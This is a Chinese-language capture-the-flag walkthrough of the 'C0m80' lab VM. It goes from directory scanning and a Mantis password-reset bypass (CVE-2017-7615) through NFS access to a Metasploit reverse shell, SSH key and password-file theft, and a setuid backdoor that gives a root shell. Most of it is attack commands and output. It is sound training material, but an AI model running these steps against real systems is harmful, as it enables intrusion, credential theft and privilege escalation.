    ---- Entering directory: http://192.168.17.140/bugs/css/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/doc/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/fonts/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/images/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/js/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/lang/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/library/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/plugins/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/scripts/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/vendor/ ----    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)
    ---- Entering directory: http://192.168.17.140/bugs/admin/check/ ----    + http://192.168.17.140/bugs/admin/check/index.php (CODE:200|SIZE:6772)
    -----------------    END_TIME: Thu Sep 20 17:17:43 2018
    DOWNLOADED: 41508 - FOUND: 12
## 入侵后台
访问`http://192.168.17.140`看起来是一个静态页面  
访问`http://192.168.17.140/dev/info.php`是一个`phpinfo`页面  
访问`http://192.168.17.140/bugs/login_page.php`使用了`Mantis`  
搜索`Mantis`的漏洞发现`CVE-2017-7615`  
直接访问`http://192.168.17.140/bugs/verify.php?id=1&confirm_hash=` 可以绕过验证重置密码
但是有ip限制 不能登陆管理员账号  
先重置`guest`账号的密码登陆 (guest账号的id')  
在`NotepadPussPuss++`的修订历史中发现`nfs` 结合nmap的扫描结果 猜测需要访问nfs  
连接nfs服务器 发现新文件
    # root @ kali in ~ [23:09:20]
    $ showmount -e 192.168.17.140
    Export list for 192.168.17.140:
    /ftpsvr/bkp *
    # root @ kali in ~ [23:09:35]
    $ mount -t nfs 192.168.17.140:/ftpsvr/bkp /mnt/
    # root @ kali in ~ [23:09:39]
    $ ls /mnt
    ftp104.bkp
`ftp104.bkp`是一个纯文本文件 记录了一个exe文件的16进制  
分析exe发现与之前扫描出来的20021端口内容有一定的重合 nc连上去确定20021端口跑的就是这个exe  
连接上去只能ls cd、get、put等命令都无效 查看了几个其他命令发现提示
    ftp>status
    Connected to 127.0.0.1
    No proxy connection.
    Connecting using address family: any.
    Mode: stream; Type: binary; Form: non-print; Structure: file
    Backup path: C:\wwwroot\dev\ftp104.bkp
    Verbose: on; Bell: off; Prompting: off; Globbing: on
    Store unique: off; Receive unique: off
    Case: off; CR stripping: on
    Quote control characters: on
    Ntrans: off
    Nmap: off
    Hash mark printing: off; Use of PORT cmds: off
    Tick counter printing: off
    ftp>system
    Bob was supposed to do this too!
    He said there might be a BOUF in one of the commands to fix first?
    Whatever that is? LOL
    He spends too much time listening to his old cd's if you ask me!
    Alice ;D
提示说有一个命令存在`BOUF` 不知道是什么东西
## RCE
ida分析了一下 发现发送url时 会被拼接到system里执行 从而导致命令执行 msf打一波
    msf > use exploit/multi/browser/firefox_proto_crmfrequest
    msf exploit(multi/browser/firefox_proto_crmfrequest) > set LHOST 192.168.17.139
    LHOST => 192.168.17.139
    msf exploit(multi/browser/firefox_proto_crmfrequest) > set target 1
    target => 1
    msf exploit(multi/browser/firefox_proto_crmfrequest) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(multi/browser/firefox_proto_crmfrequest) > show options
    Module options (exploit/multi/browser/firefox_proto_crmfrequest):
       Name           Current Setting               Required  Description
       ----           ---------------               --------  -----------       ADDONNAME      HTML5 Rendering Enhancements  yes       The addon name.
       AutoUninstall  true                          yes       Automatically uninstall the addon after payload execution
       CONTENT                                      no        Content to display inside the HTML .
       Retries        true                          no        Allow the browser to retry the module
       SRVHOST        0.0.0.0                       yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
       SRVPORT        8080                          yes       The local port to listen on.
       SSL            false                         no        Negotiate SSL for incoming connections
       SSLCert                                      no        Path to a custom SSL certificate (default is randomly generated)
       URIPATH                                      no        The URI to use for this exploit (default is random)
    Payload options (windows/meterpreter/reverse_tcp):
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.17.139   yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    Exploit target:
       Id  Name
       --  ----       1   Native Payload
    msf exploit(multi/browser/firefox_proto_crmfrequest) > run
    [*] Exploit running as background job 0.
    [*] Started reverse TCP handler on 192.168.17.139:4444
    msf exploit(multi/browser/firefox_proto_crmfrequest) > [*] Using URL: http://0.0.0.0:8080/58ylkc3pg
    [*] Local IP: http://192.168.17.139:8080/58ylkc3pg
    [*] Server started.
    [*] 192.168.17.140   firefox_proto_crmfrequest - Gathering target information for 192.168.17.140
    [*] 192.168.17.140   firefox_proto_crmfrequest - Sending HTML response to 192.168.17.140
    [*] 192.168.17.140   firefox_proto_crmfrequest - Sending HTML
    [*] 192.168.17.140   firefox_proto_crmfrequest - Sending the malicious addon
    [*] Sending stage (179779 bytes) to 192.168.17.140
    [*] Meterpreter session 1 opened (192.168.17.139:4444 -> 192.168.17.140:37212) at 2018-09-21 09:31:57 +0800
    msf exploit(multi/browser/firefox_proto_crmfrequest) > sessions -l
    Active sessions
    ===============
      Id  Name  Type                     Information        Connection
      --  ----  ----                     -----------        ----------      1         meterpreter x86/windows  C0m80\b0b @ C0m80  192.168.17.139:4444 -> 192.168.17.140:37212 (192.168.17.140)
    msf exploit(multi/browser/firefox_proto_crmfrequest) > sessions -i 1
    [*] Starting interaction with 1...
    meterpreter > sysinfo
    Computer        : C0m80
    OS              : Windows XP (Build 2600, Service Pack 3).
    Architecture    : x86
    System Language : en_GB
    Domain          : C0m80
    Logged On Users : 1
    Meterpreter     : x86/windows
查看.ssh目录
    meterpreter > ls
    Listing: Z:\home\b0b\.ssh
    =========================
    Mode              Size  Type  Last modified              Name
    ----              ----  ----  -------------              ----    100666/rw-rw-rw-  181   fil   2017-09-23 11:32:09 +0800  .save~
    100666/rw-rw-rw-  1766  fil   2017-09-23 04:05:59 +0800  id_rsa
    100666/rw-rw-rw-  391   fil   2017-09-23 04:05:59 +0800  id_rsa.pub
    100666/rw-rw-rw-  222   fil   2017-09-23 09:58:31 +0800  known_hosts
    meterpreter > cat .save~
    ###### NO PASWORD HERE SRY ######
    I'm using my new password manager
               PWMangr2
          just a note to say
       WELL DONE & KEEP IT UP ;D
    #################################
    meterpreter > search -f *PWMangr2*
    Found 1 result...
        c:\users\b0b\Application Data\Mozilla\Extensions\PWMangr2.html (71471 bytes)
    meterpreter > download 'c:\users\b0b\Application Data\Mozilla\Extensions\PWMangr2.html'
    [*] Downloading: c:\users\b0b\Application Data\Mozilla\Extensions\PWMangr2.html -> PWMangr2.html
    [*] Downloaded 69.80 KiB of 69.80 KiB (100.0%): c:\users\b0b\Application Data\Mozilla\Extensions\PWMangr2.html -> PWMangr2.html
    [*] download   : c:\users\b0b\Application Data\Mozilla\Extensions\PWMangr2.html -> PWMangr2.html
打开PWMangr2.html 需要输入密码 根据提示猜测密码为`alice` 成功登陆 获得所有密码  
## ROOT SHELL
继续搜索上面ssh的信息 因为22端口没有开放 所以看一下ssh配置文件 发现只允许本地65122端口访问
    meterpreter > cat sshd_config
    # Package generated configuration file
    # See the sshd_config(5) manpage for details
    # What ports, IPs and protocols we listen for
    Port 65122
    # Use these options to restrict which interfaces/protocols sshd will bind to
    ListenAddress ::1
    #ListenAddress 127.0.0.1
    ......
rdp没开 直接用b0b的密码登陆虚拟机 使用b0b的私钥去登陆al1ce账号
    plink –l al1ce localhost –I id_rsa –P 65122
用`7M6Kt8tC8X5Qz99@Eeb8592Z$Fd@u286`解锁私钥  
通过nfs上传后门 修改后门权限为4777
    # root @ kali in ~/pentest [16:29:55]
    $ nfspysh -o server=192.168.17.140:/ftpsvr/bkp
    PI:EMAIL:/ftpsvr/bkp:/> ls
    /:
    040770      0     34        4096 2017-09-23 09:37:01 .
    100644     34     34     2757002 2018-09-21 16:29:01 ftp104.bkp
    040770      0     34        4096 2017-09-23 09:37:01 ..
    PI:EMAIL:/ftpsvr/bkp:/> put ./shell
    PI:EMAIL:/ftpsvr/bkp:/> ls
    /:
    100644      0     34         207 2018-09-21 16:30:23 shell
    040770      0     34        4096 2018-09-21 16:30:23 .
    100644     34     34     2757002 2018-09-21 16:30:01 ftp104.bkp
    040770      0     34        4096 2018-09-21 16:30:23 ..
    PI:EMAIL:/ftpsvr/bkp:/> chmod 4777 shell
msf监听
    msf exploit(multi/handler) > run
    [*] Started reverse TCP handler on 192.168.17.141:4444
    [*] Sending stage (861480 bytes) to 192.168.17.140
    [*] Meterpreter session 3 opened (192.168.17.141:4444 -> 192.168.17.140:37131) at 2018-09-21 16:32:18 +0800
    meterpreter > shell
    Process 6205 created.
    Channel 1 created.
    id
    uid=1001(al1ce) gid=34(backup) euid=0(root) groups=0(root),34(backup)
    whoami
    root
    cd /root
    ls
    flag.txt
    cat flag.txt
    ############## WELL DONE ###############
    You dealt BestestSoftware a killer C0m80
    I really hope you enjoyed the challenge
    and learned a thing of two while on your
    journey here.
    Please leave feelback & comments at:
          https://3mrgnc3.ninja/
    All the best.
      3mrgnc3
      ;D
    ############  ROOT FLAG ##############
       K1ll3rC0m80D3@l7&i5mash3dth1580x
    ######################################
DONE